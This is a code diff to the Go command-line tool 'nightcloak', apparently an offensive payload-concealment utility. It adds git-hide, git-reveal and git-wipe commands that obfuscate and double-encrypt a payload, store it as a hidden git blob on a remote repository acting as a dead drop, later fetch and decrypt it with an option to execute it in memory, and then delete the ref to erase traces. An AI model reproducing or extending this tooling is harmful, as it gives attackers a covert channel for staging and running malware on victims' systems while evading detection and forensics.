@@ -18,11 +18,12 @@ import (
 	"nightcloak/pkg/cloak"
 	"nightcloak/pkg/cloak/native"
 	"nightcloak/pkg/crypto"
+	"nightcloak/pkg/gitdrop"
 	"nightcloak/pkg/nightmare"
 	"nightcloak/pkg/shard"
 )
 
-	const version = "0.9.6"
+	const version = "0.9.8"
 
 	const banner = `
 	╔╗╔╦═╗╔═╗╦ ╦╔╦╗╔═╗╦  ╔═╗╔═╗╦╔═
@@ -56,6 +57,12 @@ import (
 		cmdGather(os.Args[2:])
 	case "scan":
 		cmdScan(os.Args[2:])
+	case "git-hide":
+		cmdGitHide(os.Args[2:])
+	case "git-reveal":
+		cmdGitReveal(os.Args[2:])
+	case "git-wipe":
+		cmdGitWipe(os.Args[2:])
 	case "obfuscate":
 	        cmdObfuscate(os.Args[2:])
 	case "deobfuscate":
@@ -943,6 +950,191 @@ func resolvePassword(explicit string) string {
 	return pw
 }
 
+// ---------------------------------------------------------------------------
+// git-hide: encrypt payload → store as git blob under custom ref
+// ---------------------------------------------------------------------------
+
+func cmdGitHide(args []string) {
+	var password, token, ref string
+	var compress, lock bool
+	args = parseFlags(args, map[string]*string{
+		"-p": &password, "--password": &password,
+		"-t": &token, "--token": &token,
+		"-r": &ref, "--ref": &ref,
+	}, map[string]*bool{
+		"-z": &compress, "--compress": &compress,
+		"--lock": &lock,
+	})
+
+	if len(args) < 2 {
+		die("usage: nightcloak git-hide <payload|file|-> <repo-url> [-p password] [-t token] [-r ref]")
+	}
+
+	payloadArg := args[0]
+	repoURL := args[1]
+
+	password = resolvePassword(password)
+	token = resolveGitToken(token)
+	if ref == "" {
+		ref = gitdrop.DefaultRef
+	}
+
+	payload, _, _ := resolvePayload(payloadArg)
+
+	obfuscated := nightmare.NightmarifyBytes(payload)
+
+	encrypted, err := crypto.EncryptV3([]byte(obfuscated), password, compress, lock)
+	if err != nil {
+		die("encryption failed: %v", err)
+	}
+
+	xkey, err := crypto.ResolveXKey()
+	if err != nil {
+		die("KEY resolution failed: %v", err)
+	}
+	if xkey != nil {
+		encrypted, err = crypto.XEncrypt(encrypted, xkey)
+		if err != nil {
+			die("secondary encryption failed: %v", err)
+		}
+	}
+
+	client, err := gitdrop.NewClient(repoURL, token)
+	if err != nil {
+		die("invalid repo URL: %v", err)
+	}
+
+	if err := client.Hide(encrypted, ref); err != nil {
+		die("git-hide failed: %v", err)
+	}
+
+	log("Payload stored at %s → %s", repoURL, ref)
+}
+
+// ---------------------------------------------------------------------------
+// git-reveal: fetch git blob → decrypt → de-obfuscate
+// ---------------------------------------------------------------------------
+
+func cmdGitReveal(args []string) {
+	var password, token, ref, output string
+	var execute bool
+	args = parseFlags(args, map[string]*string{
+		"-p": &password, "--password": &password,
+		"-t": &token, "--token": &token,
+		"-r": &ref, "--ref": &ref,
+		"-o": &output, "--output": &output,
+	}, map[string]*bool{
+		"--exec": &execute,
+	})
+
+	if len(args) < 1 {
+		die("usage: nightcloak git-reveal <repo-url> [-p password] [-t token] [-r ref] [-o output] [--exec]")
+	}
+
+	repoURL := args[0]
+	execArgs := args[1:]
+
+	password = resolvePassword(password)
+	token = resolveGitToken(token)
+	if ref == "" {
+		ref = gitdrop.DefaultRef
+	}
+
+	client, err := gitdrop.NewClient(repoURL, token)
+	if err != nil {
+		die("invalid repo URL: %v", err)
+	}
+
+	ciphertext, err := client.Reveal(ref)
+	if err != nil {
+		die("git-reveal failed: %v", err)
+	}
+
+	raw := ciphertext
+
+	xkey, err := crypto.ResolveXKey()
+	if err != nil {
+		die("KEY resolution failed: %v", err)
+	}
+	if xkey != nil {
+		raw, err = crypto.XDecrypt(raw, xkey)
+		if err != nil {
+			die("secondary decryption failed: %v", err)
+		}
+	}
+
+	decrypted, err := crypto.Decrypt(raw, password)
+	if err != nil {
+		die("decryption failed: %v", err)
+	}
+
+	clearBytes, err := nightmare.DreamifyBytes(string(decrypted))
+	if err != nil {
+		die("de-obfuscation failed: %v", err)
+	}
+
+	if execute {
+		log("Executing payload in-memory...")
+		if err := native.MemExec(clearBytes, execArgs); err != nil {
+			die("in-memory execution failed: %v", err)
+		}
+		return
+	}
+
+	if output != "" {
+		if err := os.WriteFile(output, clearBytes, 0o644); err != nil {
+			die("writing output: %v", err)
+		}
+		log("Extracted to %s (%d bytes)", output, len(clearBytes))
+	} else {
+		os.Stdout.Write(clearBytes)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// git-wipe: delete the ref from the remote repo
+// ---------------------------------------------------------------------------
+
+func cmdGitWipe(args []string) {
+	var token, ref string
+	args = parseFlags(args, map[string]*string{
+		"-t": &token, "--token": &token,
+		"-r": &ref, "--ref": &ref,
+	}, map[string]*bool{})
+
+	if len(args) < 1 {
+		die("usage: nightcloak git-wipe <repo-url> [-t token] [-r ref]")
+	}
+
+	repoURL := args[0]
+	token = resolveGitToken(token)
+	if ref == "" {
+		ref = gitdrop.DefaultRef
+	}
+
+	client, err := gitdrop.NewClient(repoURL, token)
+	if err != nil {
+		die("invalid repo URL: %v", err)
+	}
+
+	if err := client.Wipe(ref); err != nil {
+		die("git-wipe failed: %v", err)
+	}
+
+	log("Ref %s deleted from %s", ref, repoURL)
+}
+
+func resolveGitToken(explicit string) string {
+	if explicit != "" {
+		return explicit
+	}
+	if env := os.Getenv("NIGHTCLOAK_GIT_TOKEN"); env != "" {
+		return env
+	}
+	die("GitHub token required: use -t <token> or set NIGHTCLOAK_GIT_TOKEN")
+	return ""
+}
+
 func printTHC() {
 	fmt.Fprintln(os.Stderr, `
   The Hacker's Choice -- https://www.thc.org
@@ -969,6 +1161,9 @@ func printUsage() {
     gather        Beacon-scan, reconstruct, and recover distributed payload
     scan          List all beacon-matching files in a directory tree
     exec          Direct in-memory execution of payload (Linux only)
+    git-hide      Encrypt and store payload as a git blob dead drop
+    git-reveal    Fetch and decrypt payload from a git repo dead drop
+    git-wipe      Delete the dead drop ref from the remote repo
     inspect       Show file metadata tags (no decryption)
     dump          Extract and decrypt to stdout (raw, no de-obfuscation)
     obfuscate     Pure nightmare encoding (no encryption)
